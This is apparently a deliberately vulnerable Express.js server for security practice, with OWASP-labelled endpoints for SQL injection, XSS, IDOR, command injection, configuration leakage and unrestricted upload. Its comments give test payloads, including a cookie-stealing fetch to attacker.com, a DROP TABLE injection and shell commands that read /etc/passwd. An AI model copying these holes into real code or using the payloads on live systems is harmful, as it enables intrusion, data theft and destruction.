const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const app = express();
const db = require('./db');
const { exec } = require('child_process');
const fileUpload = require('express-fileupload');
require('dotenv').config();

app.use(cors());
app.use(bodyParser.json());
app.use(fileUpload());

db.connect(err => {
    if (err) {
        console.error('❌ Errore connessione MySQL:', err.message);
        process.exit(1)
    };
    console.log("Connected to MySQL");
});

/**
 * SQL Injection Vulnerability (OWASP A03:2021)
 * Test cases:
 * 1. Username: admin'--
 *    Password: anything
 * 2. Username: ' OR '1'='1
 *    Password: anything
 * 3. Username: ' UNION SELECT * FROM users--
 *    Password: anything
 */
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
    db.query(query, (err, result) => {
        if (err) return res.status(500).send("DB Error");
        if (result.length > 0) res.send({result});
        else res.status(401).send("Invalid credentials");
    });
});

/**
 * SQL Injection in Search (OWASP A03:2021)
 * Test cases:
 * 1. term=' UNION SELECT * FROM users--
 * 2. term=' DROP TABLE products--
 * 3. term=' AND (SELECT SLEEP(5))--  // Time-based injection
 */
app.get('/search', (req, res) => {
    const searchTerm = req.query.term;
    const query = `SELECT * FROM products WHERE name LIKE '%${searchTerm}%' OR description LIKE '%${searchTerm}%'`;
    console.log("SQL Query:", query);
    db.query(query, (err, result) => {
        if (err) return res.status(500).send("Error");
        res.json(result);
    });
});

/**
 * Cross-Site Scripting (XSS) Vulnerability (OWASP A03:2021)
 * Test cases:
 * 1. ?q=<script>alert(document.cookie)</script>
 * 2. ?q=<img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">
 * 3. ?q=<svg onload="alert(document.domain)">
 */
app.get('/comment', (req, res) => {
    const comment = req.query.q;
    res.send(`<html><body>Comment: ${comment}</body></html>`);
});

/**
 * Insecure Direct Object Reference (IDOR) (OWASP A01:2021)
 * Test cases:
 * 1. /user/1 - Access admin account
 * 2. /user/2 - Access other user accounts
 * 3. /user/../../../etc/passwd - Path traversal attempt
 */
app.get('/user/:id', (req, res) => {
    const userId = req.params.id;
    // No authentication or authorization check here (IDOR)
    db.query(`SELECT * FROM users WHERE id = '${userId}'`, (err, result) => {
        if (err) return res.status(500).send("SQL Error");
        res.json(result);
    });
});

/**
 * Security Misconfiguration (OWASP A05:2021)
 * Exposes detailed error information that could help attackers
 * Test case: Access /debug to see detailed error stack traces
 */
app.get('/debug', (req, res) => {
    console.log("->", req, res);
    throw new Error('Debug endpoint exposed!');
});

/**
 * Information Disclosure (OWASP A05:2021)
 * Exposes sensitive configuration information
 * Risk: Attackers can gather information about the system
 */
app.get('/api/config', (req, res) => {
    res.json({
        dbConfig: process.env,
        serverInfo: process.versions,
        systemPath: process.cwd()
    });
});

/**
 * Cryptographic Failures (OWASP A02:2021)
 * 1. No password hashing
 * 2. SQL injection in token verification
 * 3. No token expiration check
 * Test case: SQL injection in token parameter
 */
app.post('/reset-password', (req, res) => {
    const { token, newPassword } = req.body;
    const query = `UPDATE users SET password='${newPassword}' WHERE reset_token='${token}'`;
    db.query(query, (err, result) => {
        if (err) return res.status(500).send("Error");
        res.send("Password updated");
    });
});

/**
 * Command Injection (OWASP A03:2021)
 * Test cases:
 * 1. query=; ls -la
 * 2. query=; cat /etc/passwd
 * 3. query=`curl http://attacker.com`
 */
app.get('/api/search', (req, res) => {
    const { query } = req.query;
    const cmd = `grep -r ${query} /app/data`;
    exec(cmd, (error, stdout, stderr) => {
        res.send(stdout);
    });
});

/**
 * Unrestricted File Upload (OWASP A05:2021)
 * Vulnerabilities:
 * 1. No file type validation
 * 2. No file size limits
 * 3. Original filename used (path traversal possible)
 * Test cases:
 * 1. Upload .php shell
 * 2. Upload large files
 * 3. Upload ../../../etc/passwd as filename
 */
app.post('/upload', (req, res) => {
    if (!req.files) return res.status(400).send('No files uploaded.');
    const file = req.files.file;
    file.mv(`./uploads/${file.name}`);
    res.send('File uploaded!');
});


const PORT = process.env.PORT || 4000;

app.listen(4000, '0.0.0.0', () => {
    console.log("✅ Server Express in ascolto su porta 4000");
});
